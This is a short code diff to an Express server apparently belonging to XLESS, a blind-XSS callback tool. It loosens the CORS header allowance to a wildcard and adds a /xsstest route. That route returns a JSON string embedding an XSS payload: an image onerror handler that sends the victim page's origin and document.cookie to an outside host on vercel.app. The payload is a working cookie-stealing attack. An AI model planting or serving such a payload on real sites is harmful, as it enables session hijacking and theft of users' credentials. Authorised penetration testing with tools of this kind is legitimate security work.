@@ -27,7 +27,7 @@ app.use(function (req, res, next) {
   res.header("Powered-By", "XLESS");
   res.header("Access-Control-Allow-Origin", "*");
   res.header("Access-Control-Allow-Methods", "GET,POST");
-  res.header("Access-Control-Allow-Headers", "Content-Type");
+  res.header("Access-Control-Allow-Headers", "*");
   next();
 });
 
@@ -209,6 +209,9 @@ app.all("/*", (req, res) => {
   });
 })
 
+app.all("/xsstest", (req, res) => {
+  res.send('{"debug":"<img src=x onerror=fetch(`https://xless-neon.vercel.app/?origin=${origin}&cookie=${document.cookie}`)>"}')
+})
 
 app.listen(port, err => {
     if (err) throw err
